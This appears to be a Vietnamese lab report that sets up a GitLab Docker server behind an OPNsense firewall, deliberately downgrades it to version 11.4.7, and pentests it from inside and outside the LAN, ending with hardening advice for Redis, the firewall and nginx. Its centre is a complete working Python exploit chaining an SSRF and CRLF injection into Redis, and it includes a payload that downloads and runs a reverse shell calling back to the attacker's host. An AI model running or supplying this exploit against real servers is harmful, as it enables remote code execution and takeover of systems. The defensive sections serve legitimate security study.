> 1\. Chuẩn bị thư mục và SSL
>
> mkdir -p \~/gitlab/ssl
>
> cd \~/gitlab/ssl
>
> \# Tạo chứng chỉ SSL tự ký cho GitLab
>
> openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \\
>
> -subj \"/CN=gitlab.example.com\" \\
>
> -keyout gitlab.example.com.key \\
>
> -out gitlab.example.com.crt
>
> 3\. Tạo Docker Network
>
> docker network create backend
>
> 4\. Khởi động GitLab Container
>
> cd \~/gitlab-docker
>
> docker compose up -d
>
> 5\. Trỏ domain vào localhost (nếu chạy test máy local)
>
> echo \"127.0.0.1 gitlab.example.com\" \>\> /etc/hosts
>
> **💬 Ghi chú thêm:**

- Biến GITLAB_HOME phải export hoặc set thủ công trong .env. Ví dụ:

> export GITLAB_HOME=/srv/gitlab
>
> hoặc trong file .env:
>
> GITLAB_HOME=/srv/gitlab
>
> Nếu dùng chứng chỉ Let\'s Encrypt thì phần SSL trong
> docker-compose.yml sẽ thay bằng cert thực.

##  **Cấu hình thông port để public dịch vụ ra ngoài** {#cấu-hình-thông-port-để-public-dịch-vụ-ra-ngoài}

Lúc này đã có thể truy cập nginx nhưng vẫn chưa thể truy cập dịch vụ,
cần **cho phép truy cập từ client (192.168.160.10) vào GitLab** đang
chạy trong container (port 8080) trên máy Ubuntu Server (192.168.1.30),
thì bạn chỉ cần **thêm 1 NAT Port Forward rule** + rule trên Firewall.

![](media/image29.png){width="6.5in" height="2.134027777777778in"}

![](media/image30.png){width="6.5in" height="3.3784722222222223in"}

**Thêm NAT Port Forward cho port 8080**

Vào **Firewall \> NAT \> Port Forward**, bấm **Add**:

| **Trường**                 | **Giá trị**                 |
|----------------------------|-----------------------------|
| **Interface**              | WAN                         |
| **Protocol**               | TCP                         |
| **Destination**            | WAN Address                 |
| **Destination port range** | 8080                        |
| **Redirect target IP**     | 192.168.1.30                |
| **Redirect target port**   | 8080                        |
| **Description**            | NAT GitLab Docker Port 8080 |

**Save** và **Apply changes**

![](media/image31.png){width="6.5in" height="0.1875in"}

**Thêm Firewall Rule ở WAN**

Vào **Firewall \> Rules \> WAN**, bấm **Add**:

| **Trường**                 | **Giá trị**                                                             |
|----------------------------|-------------------------------------------------------------------------|
| **Action**                 | Pass                                                                    |
| **Protocol**               | TCP                                                                     |
| **Source**                 | 192.168.160.10 (hoặc any nếu muốn tất cả các máy ngoài có thể truy cập) |
| **Destination**            | WAN address                                                             |
| **Destination port range** | 8080                                                                    |
| **Description**            | Allow GitLab 8080 to Ubuntu Server                                      |

**Save** và **Apply changes**

![](media/image32.png){width="6.5in" height="0.6597222222222222in"}

Kiểm tra lại xem đã truy cập được hay chưa

![](media/image33.png){width="6.5in" height="3.442361111111111in"}

IV. []{#_Toc197592897 .anchor}Pentest

## **Tạo vul**

**🔹 Bước 1: Stop + Remove container**

docker stop gitlab-congdonglinux

docker rm gitlab-congdonglinux

🔹 Bước 2: **Chỉnh sửa docker-compose.yml**

**image: gitlab/gitlab-ee:latest**

Thay thành (ví dụ):

**image: gitlab/gitlab-ee:** **11.4.7-ce.0**

**🔹 Bước 3: Kéo image cũ về và run lại**

docker compose pull

docker compose up -d

**🔹 Bước 4: Kiểm tra lại version**

Truy cập web: https://192.168.1.30/help  
Hoặc:

curl -k https://192.168.1.30/help \| grep -i version

🔹 Bước 5: **Khai thác lỗ hổng RCE**

## Về vul

**CVE-2018-19571 (SSRF)** - Server-Side Request Forgery:

- Đây là lỗ hổng cho phép kẻ tấn công lừa máy chủ thực hiện các yêu cầu
  HTTP đến các địa chỉ nội bộ hoặc các dịch vụ khác mà thông thường
  không thể truy cập được từ ngoài.

- Trong trường hợp này, lỗ hổng SSRF được kích hoạt thông qua trường
  import_url khi tạo một project. Trường này có thể được lợi dụng để gửi
  các lệnh đến Redis (chạy trên localhost) bằng giao thức git://.

**CVE-2018-19585 (CRLF Injection)** - Carriage Return Line Feed
Injection:

- Lỗ hổng này cho phép chèn các ký tự đặc biệt (CRLF) vào các yêu cầu
  HTTP hoặc dữ liệu đầu vào, dẫn đến việc tạo hoặc thay đổi các lệnh
  hoặc nội dung không mong muốn.

- Trong ngữ cảnh GitLab, CRLF được sử dụng để chèn các lệnh Redis (qua
  SSRF) nhằm thực thi mã độc hại trên server.

## Exploit vul  {#exploit-vul}

Để  **khai thác CVE-2021-22205** , bạn phải làm theo các bước sau:

curl -k -s https://gitlab.example.com/users/sign_in

Từ đây, bạn cần trích xuất ID phiên cookie và mã thông báo CSRF.

┌──(kali㉿kali)-\[\~/Desktop\]

└─\$ sudo su

\[sudo\] password for kali:

┌──(root㉿kali)-\[/home/kali/Desktop\]

└─# curl -i http://192.168.1.30:8080

![](media/image34.png){width="6.5in" height="1.4777777777777779in"}

Khi truy cập http://192.168.1.30:8080, sẽ bị chuyển hướng tới trang đăng
nhập http://192.168.1.30:8080/users/sign_in. Điều này có nghĩa là cần
phải đăng nhập để tiếp tục sử dụng GitLab.

Trong thông tin trên có thể thấy một số thứ đáng chú ý:

- **Server: nginx**: Cho biết rằng GitLab đang chạy trên nginx, điều này
  có thể giúp tìm các lỗ hổng trong cấu hình nginx (nếu có).

- **Location: <http://192.168.1.30:8080/users/sign_in>**: GitLab yêu cầu
  đăng nhập. Tuy nhiên, có thể thử tìm cách khai thác lỗ hổng không cần
  đăng nhập.

- **Set-Cookie**: Thông tin về cookie có thể hữu ích nếu muốn thực hiện
  tấn công session hijacking, nhưng trong trường hợp này cookie có thuộc
  tính HttpOnly, nghĩa là không thể truy cập từ JavaScript (tức là phải
  khai thác qua server-side).

- **Strict-Transport-Security**: Được kích hoạt, điều này ngăn chặn
  downgrade attack từ HTTP lên HTTPS, không thể bypass để khai thác hệ
  thống qua HTTP.

## Pen LAN

**Bước 1: Xác định phiên bản GitLab (Recon/Fingerprint)**

Check searchsploit có CVE nào khai thác được

searchsploit gitlab

![](media/image35.png){width="6.5in" height="1.5798611111111112in"}

Dùng searchsploit để tìm CVE phù hợp với GitLab:

msfconsole

search gitlab

![](media/image36.png){width="6.5in" height="2.3125in"}

### Script

import requests

from bs4 import BeautifulSoup

import sys

import time

import random

import string

import urllib.parse

print(\"\[+\] GitLab 11.4.7 SSRF + CRLF RCE Exploit\")

print(\"\[+\] CVE-2018-19571 + CVE-2018-19585\")

\# Cấu hình

gitlab_url = \"http://gitlab.local:8080\"

username = \"root\"

password = \"vohoangphat\"

lhost = \"192.168.1.40\" \# IP máy của bạn để nhận reverse shell

lport = \"4444\"

\# Khởi tạo session

session = requests.Session()

def get_random_name():

\"\"\"Tạo tên project ngẫu nhiên\"\"\"

return \'\'.join(random.choices(string.ascii_lowercase, k=8))

def get_csrf_token():

try:

print(\"\[+\] Đang lấy CSRF token\...\")

response = session.get(f\"{gitlab_url}/users/sign_in\")

if response.status_code != 200:

print(f\"\[-\] Không thể truy cập trang đăng nhập:
{response.status_code}\")

sys.exit(1)

soup = BeautifulSoup(response.text, \"html.parser\")

token = soup.find(\'meta\', {\'name\': \'csrf-token\'})

if token:

token_value = token.get(\"content\")

print(f\"\[+\] CSRF Token: {token_value}\")

return token_value

else:

print(\"\[-\] Không thể tìm thấy CSRF token\")

sys.exit(1)

except Exception as e:

print(f\"\[-\] Lỗi khi lấy CSRF token: {e}\")

sys.exit(1)

def login():

try:

csrf_token = get_csrf_token()

print(\"\[+\] Đang đăng nhập\...\")

login_data = {

\"authenticity_token\": csrf_token,

\"user\[login\]\": username,

\"user\[password\]\": password,

\"user\[remember_me\]\": \"0\"

}

response = session.post(f\"{gitlab_url}/users/sign_in\",
data=login_data)

if response.status_code == 200 and \"Invalid\" not in response.text:

print(\"\[+\] Đăng nhập thành công!\")

return csrf_token

else:

print(\"\[-\] Đăng nhập thất bại. Kiểm tra tên đăng nhập và mật khẩu.\")

sys.exit(1)

except Exception as e:

print(f\"\[-\] Lỗi khi đăng nhập: {e}\")

sys.exit(1)

def get_project_info():

\"\"\"Lấy thông tin cần thiết cho việc tạo project\"\"\"

try:

print(\"\[+\] Đang lấy thông tin cho project\...\")

project_page = session.get(f\"{gitlab_url}/projects/new\")

soup = BeautifulSoup(project_page.text, \"html.parser\")

project_token = soup.find(\'meta\', {\'name\':
\'csrf-token\'}).get(\"content\")

namespace_id = soup.find(\'input\', {\'name\':
\'project\[namespace_id\]\'})

if namespace_id:

namespace_id = namespace_id.get(\'value\')

else:

\# Thử tìm từ dropdown nếu không có input field

namespace_select = soup.find(\'select\', {\'name\':
\'project\[namespace_id\]\'})

if namespace_select:

namespace_option = namespace_select.find(\'option\', selected=True) or
namespace_select.find(\'option\')

if namespace_option:

namespace_id = namespace_option.get(\'value\')

else:

namespace_id = \"1\" \# Default cho user root

else:

namespace_id = \"1\"

print(f\"\[+\] Project CSRF Token: {project_token}\")

print(f\"\[+\] Namespace ID: {namespace_id}\")

return project_token, namespace_id

except Exception as e:

print(f\"\[-\] Lỗi khi lấy thông tin project: {e}\")

sys.exit(1)

def exploit(project_token, namespace_id, option):

try:

project_name = get_random_name()

print(f\"\[+\] Tên project: {project_name}\")

\# Tạo payload Redis dựa vào lựa chọn (tải file hoặc thực thi)

if option == \"1\":

\# Payload để tải shell.py xuống máy mục tiêu

print(\"\[+\] Tạo payload để tải shell.py\...\")

redis_command = f\"\"\"

multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push
\"{{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":\[\\\"class_eval\\\",\\\"open(\\\'\|wget
http://{lhost}/shell.py -O /tmp/shell.py
\\\').read\\\"\],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}}\"

exec

exec

exec

\"\"\"

else:

\# Payload để thực thi shell.py đã tải về

print(\"\[+\] Tạo payload để thực thi shell.py\...\")

redis_command = f\"\"\"

multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push
\"{{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":\[\\\"class_eval\\\",\\\"open(\\\'\|python3
/tmp/shell.py
\\\').read\\\"\],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}}\"

exec

exec

exec

\"\"\"

\# Sử dụng IPv6 localhost để bypass filter

\# Địa chỉ ::1 hoặc 0:0:0:0:0:ffff:127.0.0.1 đều là localhost trong IPv6

ipv6_url = \"git://\[0:0:0:0:0:ffff:127.0.0.1\]:6379/test/ssrf.git\"

\# Kết hợp URL và Redis command

import_url = f\"{ipv6_url}{redis_command}\"

\# Chuẩn bị dữ liệu form

project_data = {

\"utf8\": \"✓\",

\"authenticity_token\": project_token,

\"project\[ci_cd_only\]\": \"false\",

\"project\[import_url\]\": import_url,

\"project\[name\]\": project_name,

\"project\[namespace_id\]\": namespace_id,

\"project\[path\]\": project_name,

\"project\[description\]\": \"\",

\"project\[visibility_level\]\": \"0\"

}

print(\"\[+\] Đang gửi payload\...\")

\# Thiết lập headers

headers = {

\'User-Agent\': \'Mozilla/5.0 (X11; Linux x86_64; rv:68.0)
Gecko/20100101 Firefox/68.0\',

\'Content-Type\': \'application/x-www-form-urlencoded\',

\'Referer\': f\'{gitlab_url}/projects/new\',

\'Accept\':
\'text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\'

}

\# Gửi request

response = session.post(f\"{gitlab_url}/projects\",

data=project_data,

headers=headers,

allow_redirects=False)

if response.status_code in \[200, 201, 302\]:

print(\"\[+\] Payload đã được gửi thành công!\")

print(f\"\[+\] Response status: {response.status_code}\")

return True

else:

print(f\"\[-\] Gửi payload thất bại. Status code:
{response.status_code}\")

print(f\"\[-\] Response text: {response.text\[:500\]}\...\")

return False

except Exception as e:

print(f\"\[-\] Lỗi khi thực hiện exploit: {e}\")

return False

def create_shell_file():

\"\"\"Tạo file reverse shell để tải lên server\"\"\"

try:

print(\"\[+\] Đang tạo file shell.py cho reverse shell\...\")

python_shell = f\'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);\'

with open(\"shell.py\", \"w\") as shell_file:

shell_file.write(python_shell)

print(\"\[+\] File shell.py đã được tạo\")

return True

except Exception as e:

print(f\"\[-\] Lỗi khi tạo file shell.py: {e}\")

return False

def main():

print(\"\[+\] Chương trình khai thác GitLab 11.4.7 SSRF + CRLF RCE\")

print(\"\[+\] Target:\", gitlab_url)

\# Đăng nhập và lấy CSRF token

login()

\# Lấy thông tin project

project_token, namespace_id = get_project_info()

\# Tạo shell.py

create_shell_file()

\# Hỏi người dùng về HTTP server

print(\"\[+\] Hãy bắt đầu HTTP server để có thể tải shell.py lên máy mục
tiêu\")

print(\"\[+\] Lệnh: python3 -m http.server 80\")

print(\"\[+\] Và bắt đầu listener: nc -lvnp\", lport)

http_server = input(\"Đã khởi động HTTP server chưa? (Y/n): \") or \"Y\"

if http_server.upper() != \"Y\":

print(\"\[-\] Vui lòng khởi động HTTP server trước khi tiếp tục\")

sys.exit(1)

print(\"\[+\] Quá trình khai thác có 2 bước:\")

print(\"\[+\] Bước 1: Tải shell.py về máy mục tiêu\")

print(\"\[+\] Bước 2: Thực thi shell.py để lấy reverse shell\")

option = input(\"Thực hiện bước nào? (1/2): \")

if option not in \[\"1\", \"2\"\]:

print(\"\[-\] Lựa chọn không hợp lệ\")

sys.exit(1)

\# Thực hiện khai thác

success = exploit(project_token, namespace_id, option)

if success:

if option == \"1\":

print(\"\[+\] Payload tải shell.py đã được gửi đi\")

print(\"\[+\] Kiểm tra HTTP server của bạn để xem có request đến
không\")

print(\"\[+\] Sau đó thực hiện bước 2 để kích hoạt reverse shell\")

else:

print(\"\[+\] Payload thực thi shell.py đã được gửi đi\")

print(\"\[+\] Kiểm tra listener của bạn để xem có kết nối đến không\")

else:

print(\"\[-\] Khai thác thất bại\")

if \_\_name\_\_ == \"\_\_main\_\_\":

main()

### Tổng quan script khai thác

**CVE-2018-19571 (SSRF)**

- Trường import_url trong GitLab được thiết kế để nhập các repository từ
  các URL bên ngoài.

- Nếu không kiểm tra kỹ, kẻ tấn công có thể sử dụng các URL đặc biệt như
  git:// để kết nối đến các dịch vụ nội bộ (như Redis).

- Ví dụ: git://127.0.0.1:6379/test.git giả mạo là một request hợp lệ,
  nhưng thực chất là gửi lệnh đến Redis.

**CVE-2018-19585 (CRLF Injection)**

- Redis sử dụng các lệnh dạng text, do đó CRLF (\r\n) có thể được sử
  dụng để chèn các lệnh mới.

- Lệnh Redis được sử dụng để thêm job vào hàng đợi resque:gitlab:queues
  trong GitLab. Job này sẽ được xử lý bởi GitLab và thực thi mã độc hại.

**Mức độ nguy hiểm**

- **Rất cao**:

  - Khi khai thác thành công, bạn có thể thực thi mã tùy ý trên server
    mục tiêu.

  - Điều này có thể dẫn đến việc giành quyền kiểm soát server, đánh cắp
    dữ liệu, hoặc tiếp tục tấn công các hệ thống nội bộ khác.

**Các điều kiện cần để khai thác**

1.  **Tài khoản người dùng hợp lệ**:

    - Bạn cần có quyền truy cập hợp lệ trên GitLab để khai thác các lỗ
      hổng này.

2.  **Redis đang chạy trên localhost**:

    - Khai thác yêu cầu Redis phải được triển khai trên cùng máy chủ với
      GitLab.

3.  **GitLab không vá lỗi**:

    - Lỗ hổng này đã được vá trong các phiên bản GitLab mới hơn. Do đó,
      mục tiêu phải đang chạy phiên bản dễ bị tấn công (11.4.7 hoặc cũ
      hơn).

### Show key

Phía tấn công

![](media/image37.png){width="6.5in" height="2.488888888888889in"}

![](media/image38.png){width="6.292544838145232in"
height="2.3024048556430445in"}

![](media/image39.png){width="6.5in" height="2.910416666666667in"}

![](media/image40.png){width="6.5in" height="4.365972222222222in"}Phía
máy chủ

![](media/image41.png){width="6.5in" height="2.1770833333333335in"}

![](media/image42.png){width="6.5in" height="3.457638888888889in"}

![](media/image43.png){width="6.5in" height="1.8631944444444444in"}

![](media/image44.png){width="6.5in" height="1.1229166666666666in"}

## Pen WAN

**Điều kiện cần thiết**

- **Dịch vụ Redis và GitLab có thể truy cập được từ bên ngoài:**

  - Máy chủ Redis và GitLab phải được cấu hình để chấp nhận các kết nối
    từ địa chỉ IP bên ngoài.

  - Nếu Redis hoặc GitLab đang chạy trên mạng nội bộ (LAN), bạn cần cấu
    hình OPNsense để chuyển tiếp (port forwarding) các yêu cầu từ bên
    ngoài vào mạng nội bộ.

- **OPNsense được cấu hình để chuyển tiếp cổng (Port Forwarding):**

  - Bạn cần cấu hình OPNsense để cho phép truy cập từ bên ngoài đến cổng
    Redis (6379) và GitLab (80 hoặc 443).

- **Môi trường mạng:**

  - Kiểm tra rằng bạn có thể truy cập địa chỉ IP công cộng của OPNsense
    từ máy tấn công bên ngoài.

1.  []{#_Toc197592906 .anchor}Show key

Khác ở chỗ sẽ đi nhận từ fw

![](media/image45.png){width="6.011255468066492in"
height="1.510627734033246in"}

Tương tự

![](media/image46.png){width="6.5in" height="4.402083333333334in"}

## Sự khác nhau

### **Exploit qua Firewall (Từ ngoài vào mạng nội bộ)**

Khi thực hiện khai thác từ ngoài vào (từ mạng Internet vào hệ thống
trong LAN), thường có một số bước và nguyên lý lý thuyết mạng sau:

- **Địa chỉ IP công cộng vs. Địa chỉ IP riêng**:

  - Các hệ thống trong LAN thường sử dụng địa chỉ **IP riêng** (private
    IPs) như 192.168.x.x, 10.x.x.x, hoặc 172.16.x.x đến 172.31.x.x.

  - Khi bạn tấn công từ bên ngoài vào, bạn cần phải đi qua **địa chỉ IP
    công cộng** của mạng, và từ đó đi qua **NAT** (Network Address
    Translation) hoặc **port forwarding** nếu mạng LAN muốn cho phép
    truy cập từ ngoài vào một số dịch vụ cụ thể.

- **Quá trình NAT (Network Address Translation)**:

  - Các tường lửa hoặc router sử dụng **NAT** để chuyển đổi các địa chỉ
    IP nội bộ thành địa chỉ IP công cộng. Khi một gói dữ liệu được gửi
    từ trong LAN ra ngoài (ví dụ: từ máy tính của bạn ra internet), NAT
    sẽ thay đổi địa chỉ IP nguồn thành địa chỉ IP công cộng của router,
    và khi gói dữ liệu từ ngoài vào, NAT sẽ chuyển lại địa chỉ đến đúng
    thiết bị trong LAN.

  - Nếu khai thác là để truy cập một dịch vụ cụ thể trong LAN, bạn cần
    phải có cổng mở trên router/firewall. Điều này có thể thông qua
    **port forwarding**, cho phép gói tin từ bên ngoài đi vào một dịch
    vụ cụ thể trong LAN.

- **Tường lửa (Firewall) và ACL (Access Control Lists)**:

  - Tường lửa có thể kiểm tra **gói tin** (packet) dựa trên các quy tắc
    như địa chỉ IP nguồn, cổng nguồn, cổng đích, giao thức, và các tham
    số khác. Các tường lửa thường **chặn** các kết nối không hợp lệ từ
    mạng ngoài vào mạng nội bộ, chỉ cho phép các kết nối hợp lệ như
    HTTP, HTTPS hoặc SSH vào các dịch vụ được phép.

- **Khai thác từ bên ngoài**:

  - Một khi bạn vượt qua firewall và NAT, bạn có thể khai thác các dịch
    vụ công cộng (như một dịch vụ web chạy trên cổng 80/443 hoặc SSH
    trên cổng 22) nếu những dịch vụ đó có lỗ hổng bảo mật. Tuy nhiên,
    firewall và NAT làm giảm khả năng khai thác từ bên ngoài vì chúng
    làm nhiệm vụ ngăn chặn không cho các kết nối lạ xâm nhập vào mạng
    nội bộ.

### **Exploit trong LAN (Trong cùng mạng nội bộ)**

Khi thực hiện khai thác trong cùng một mạng LAN, các điều kiện về lý
thuyết mạng thay đổi như sau:

- **Địa chỉ IP nội bộ**:

  - Trong LAN, tất cả các thiết bị đều có **địa chỉ IP riêng**, và chúng
    có thể giao tiếp trực tiếp với nhau mà không cần phải đi qua NAT
    hoặc tường lửa giữa các thiết bị. Các địa chỉ như 192.168.x.x hoặc
    10.x.x.x cho phép các máy tính trong mạng nội bộ giao tiếp trực tiếp
    mà không có sự can thiệp của các lớp bảo mật.

- **Không có NAT hoặc Firewall giữa các thiết bị trong LAN**:

  - Khi khai thác trong LAN, các kết nối không bị giới hạn bởi NAT hoặc
    firewall, và bạn có thể giao tiếp trực tiếp với các máy khác trong
    cùng mạng mà không gặp phải các rào cản bảo mật. Điều này làm tăng
    khả năng khai thác, vì kẻ tấn công có thể kết nối trực tiếp với các
    dịch vụ (cả các dịch vụ có thể không được bảo mật đúng cách trong
    môi trường LAN).

- **Giao thức và kết nối**:

  - Trong mạng LAN, các giao thức mạng như **ARP (Address Resolution
    Protocol)**, **NetBIOS**, hoặc **SMB (Server Message Block)** có thể
    bị lợi dụng nếu có các điểm yếu trong việc cấu hình mạng.

  - Các cuộc tấn công như **Man-in-the-Middle (MITM)** có thể xảy ra nếu
    một máy tính trong mạng nội bộ có thể giả mạo hoặc ngụy tạo ARP
    request để chiếm quyền kiểm soát luồng dữ liệu giữa các máy khác
    trong LAN.

- **Mạng không có các rào cản bảo mật**:

  - Khi các thiết bị đều ở trong cùng một mạng, không có lớp bảo mật
    giữa chúng (như NAT, firewall, hoặc proxy), khiến cho việc khai thác
    trở nên dễ dàng hơn vì các kết nối giữa các thiết bị là **mở và
    không có kiểm soát**.

- **Công cụ khai thác nội bộ**:

  - Kẻ tấn công có thể dễ dàng tận dụng các công cụ như **Nmap** hoặc
    **Wireshark** để quét mạng và thu thập thông tin về các cổng mở, các
    dịch vụ đang chạy, hoặc thậm chí tìm các mật khẩu trong các kết nối
    không được mã hóa.

### Sumary

| **Yếu tố**                | **Exploit qua Firewall (Từ ngoài vào)**                                                        | **Exploit trong LAN**                                                                                   |
|---------------------------|------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| **Địa chỉ IP**            | Sử dụng IP công cộng, cần phải thông qua NAT và port forwarding để tiếp cận dịch vụ trong LAN. | Sử dụng IP nội bộ, không có NAT hay firewall giữa các thiết bị, cho phép giao tiếp trực tiếp.           |
| **Firewall/NAT**          | Firewall và NAT hạn chế việc truy cập từ ngoài vào, yêu cầu mở cổng và cấu hình bảo mật.       | Không có firewall hoặc NAT, các thiết bị trong LAN có thể giao tiếp trực tiếp với nhau.                 |
| **Giao thức**             | Giao tiếp phải đi qua firewall và có thể bị chặn hoặc kiểm tra.                                | Giao thức mạng nội bộ như ARP, SMB có thể bị khai thác nếu cấu hình kém.                                |
| **Phát hiện và Giám sát** | Các kết nối từ ngoài dễ bị phát hiện qua các hệ thống IDS/IPS và giám sát mạng.                | Khai thác trong LAN khó phát hiện hơn, vì không có firewall/ngăn chặn trực tiếp.                        |
| **Bảo mật mạng**          | Tường lửa và các lớp bảo mật khác bảo vệ các dịch vụ khỏi bị khai thác từ ngoài.               | Mạng LAN có thể thiếu các lớp bảo mật, dễ bị khai thác nếu dịch vụ nội bộ không được bảo mật đúng cách. |

## Đề xuất biện pháp phòng thủ nội bộ và ngoại vi

### Đề xuất biện pháp phòng thủ nội bộ

1.  **Cập nhật GitLab**:

    - Nâng cấp lên phiên bản mới nhất để khắc phục các lỗ hổng này.

2.  **Giới hạn truy cập đến Redis**:

    - Đảm bảo rằng chỉ các dịch vụ được phép mới có thể truy cập Redis
      (ví dụ: bằng cách sử dụng tường lửa hoặc socket Unix thay vì TCP).

Để giới hạn truy cập vào Redis và đảm bảo chỉ các dịch vụ được phép mới
có thể truy cập, có thể thực hiện các bước sau:

1\. Chuyển Redis sang sử dụng socket Unix

Redis hỗ trợ giao tiếp qua socket Unix thay vì TCP. Điều này sẽ giới hạn
truy cập Redis chỉ từ các ứng dụng trên cùng máy chủ.

Cách thực hiện:

\- Mở file cấu hình Redis (\`redis.conf\`), thường nằm tại
\`/etc/redis/redis.conf\` hoặc \`/etc/redis.conf\`.

\- Tìm và sửa dòng sau:

plaintext

\# Uncomment để kích hoạt socket Unix

unixsocket /var/run/redis/redis.sock

unixsocketperm 770

\- \*\*Giải thích:\*\*

\- \`unixsocket\`: Đường dẫn tới file socket, thường nằm trong
\`/var/run/redis/\`.

\- \`unixsocketperm\`: Quyền truy cập socket (\`770\` cho phép chỉ người
dùng Redis và nhóm được cấp quyền mới có thể truy cập).

\- Đảm bảo rằng chỉ các dịch vụ được phép (ví dụ: GitLab) có quyền truy
cập socket:

sudo usermod -a -G redis gitlab

\- Bình luận hoặc xóa dòng cấu hình liên quan đến TCP để tắt giao tiếp
qua TCP:

\# Tắt giao tiếp qua TCP

\#bind 127.0.0.1

\#port 6379

\- Khởi động lại Redis để áp dụng thay đổi:

sudo systemctl restart redis

2\. Cấu hình mật khẩu cho Redis

Nếu bạn vẫn cần mở Redis ra bên ngoài (cho một số dịch vụ cụ thể), hãy
thêm mật khẩu để bảo vệ truy cập.

Cách thực hiện:

Mở file cấu hình Redis (\`redis.conf\`).

Tìm và sửa dòng sau:

requirepass your_redis_password

Khởi động lại Redis:

sudo systemctl restart redis

Khi truy cập Redis, cần cung cấp mật khẩu:

redis-cli -a your_redis_password

3\. Theo dõi và kiểm soát truy cập Redis

\- Sử dụng công cụ như \`fail2ban\` để giám sát kết nối Redis.

\- Kiểm tra log Redis (\`/var/log/redis/redis.log\`) thường xuyên để
phát hiện các kết nối không hợp lệ.

4\. Kết hợp với GitLab

Nếu bạn sử dụng GitLab:

\- Đảm bảo rằng GitLab được cấu hình để sử dụng socket Unix hoặc địa chỉ
IP cụ thể:

\- Chỉnh sửa file \`/etc/gitlab/gitlab.rb\`:

redis\[\'unixsocket\'\] = \'/var/run/redis/redis.sock\'

\- Áp dụng thay đổi và khởi động lại GitLab:

sudo gitlab-ctl reconfigure

sudo gitlab-ctl restart

Để phòng thủ chống lại cuộc tấn công khai thác SSRF và CRLF RCE trên
GitLab, đặc biệt là khi khai thác các lỗ hổng như CVE-2018-19571 và
CVE-2018-19585, có một số biện pháp phòng thủ bạn có thể áp dụng từ mạng
WAN (Wide Area Network) và trong cấu hình hệ thống của GitLab. Dưới đây
là một số chiến lược phòng thủ:

### Đề xuất biện pháp phòng thủ ngoại vi

**1. Cập nhật GitLab**

- **Đảm bảo GitLab luôn được cập nhật**: Các bản vá bảo mật cho GitLab
  sẽ đóng vai trò quan trọng trong việc ngăn chặn các khai thác từ SSRF
  và CRLF RCE. GitLab đã phát hành các bản vá cho các lỗ hổng này, vì
  vậy việc sử dụng phiên bản mới nhất (hoặc các phiên bản đã được vá) là
  rất quan trọng.

Chỉnh sửa docker-compose.yml

image: gitlab/gitlab-ee: 11.4.7-ce.0

Thay thành (ví dụ):

image: gitlab/gitlab-ee:latest

**2. Cấu hình Firewall và Proxy**

- **Firewall**: Sử dụng firewall để chặn tất cả các kết nối không cần
  thiết từ WAN đến các port của GitLab, chỉ cho phép kết nối từ các địa
  chỉ IP đáng tin cậy. Ví dụ, chỉ cho phép truy cập qua HTTPS (port 443)
  hoặc SSH (port 22) cho các kết nối quản trị.

- **Reverse Proxy (Nginx/HAProxy)**: Đặt một reverse proxy trước GitLab
  để kiểm soát và lọc các request trước khi chúng đến GitLab, giúp ngăn
  chặn các yêu cầu độc hại. Reverse proxy có thể giúp giảm thiểu rủi ro
  của các lỗ hổng SSRF bằng cách cấu hình để chặn truy cập đến các địa
  chỉ nội bộ hoặc không hợp lệ.

**3. Giới hạn quyền truy cập Redis**

- **Giới hạn truy cập Redis**: Nếu GitLab sử dụng Redis, hãy cấu hình
  Redis để chỉ cho phép truy cập từ các địa chỉ IP hoặc mạng đáng tin
  cậy, tránh việc kẻ tấn công có thể gửi yêu cầu đến Redis từ các dịch
  vụ bên ngoài.

Cấu hình Redis chỉ lắng nghe trên localhost

sudo nano /etc/redis/redis.conf

Đảm bảo dòng này không bị comment (không có dấu \# phía trước). Dòng này
sẽ chỉ cho phép Redis lắng nghe trên localhost.

Nếu bạn muốn giới hạn theo một IP nội bộ cụ thể (VD: 192.168.1.30), bạn
có thể thay dòng đó thành:

bind 127.0.0.1 192.168.1.30

Vô hiệu hóa kết nối Redis từ xa

Tìm dòng sau trong redis.conf:

protected-mode yes

Giữ nguyên là yes để Redis từ chối mọi kết nối từ địa chỉ không phải
127.0.0.1 trừ khi đã cấu hình bind rõ ràng.

Nếu bạn dùng **Docker**, cần thiết kế mạng Docker sao cho Redis **không
publish port 6379** ra bên ngoài (chỉ expose nội bộ):

\# Ví dụ Docker Compose

redis:

image: redis

ports: \[\] \# hoặc không dùng \'ports\' để chỉ expose nội bộ

networks:

\- gitlab_net

**4. Giới hạn đầu vào và xử lý URL**

- **Kiểm tra đầu vào (Input Validation)**: GitLab cần kiểm tra và xác
  nhận đầu vào từ người dùng một cách nghiêm ngặt, bao gồm việc xác thực
  các URL và các tham số được gửi qua form. Điều này có thể giúp ngăn
  ngừa việc gửi các yêu cầu SSRF đến các dịch vụ nội bộ hoặc máy chủ
  không mong muốn.

- **Chặn các URL đặc biệt**: Giới hạn các loại URL có thể được nhập vào
  GitLab (ví dụ: chỉ cho phép các URL hợp lệ cho các dự án hoặc repo),
  đặc biệt là đối với các URL liên quan đến Redis hoặc các địa chỉ nội
  bộ như 127.0.0.1, localhost, 0.0.0.0.

Chặn URL đặc biệt như Redis, localhost

Thêm lớp bảo vệ ứng dụng web phía trước GitLab (như nginx reverse
proxy), có thể block URL nội bộ ngay tại proxy layer:

Ví dụ chặn SSRF qua nginx:

location / {

if (\$arg_url \~\*
\"127\\0\\0\\1\|localhost\|0\\0\\0\\0\|169\\254\|192\\168\|10\\\|172\\(1\[6-9\]\|2\[0-9\]\|3\[0-1\])\")
{

return 403;

}

proxy_pass http://gitlab;

}

